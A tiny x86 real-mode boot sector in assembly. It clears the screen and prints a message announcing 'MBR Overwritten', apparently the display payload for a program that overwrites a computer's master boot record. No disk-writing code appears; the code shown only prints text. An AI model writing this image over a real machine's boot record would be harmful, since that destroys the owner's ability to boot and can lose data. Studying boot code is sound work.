BITS    16
ORG     0x7c00
jmp start

start:
        call clear_screen
        mov ax,cs
        mov ds,ax
        mov si,msg

        call print
        jmp $

print:
        pusha
        cld
next:
        lodsb
        or al, al
        jz done
        call printchar
        jmp next
done:
        popa
        ret

printchar:
        mov ah,0x0e
        int 0x10
        ret

clear_screen:
        mov ah, 0x07
        mov al, 0x00
        mov bh, 0x09 
        mov cx, 0x0000 
        mov dx, 0x184f
        int 0x10
        ret

msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwritten :D", 0
times 510 - ($-$$) db 0
dw        0xaa55
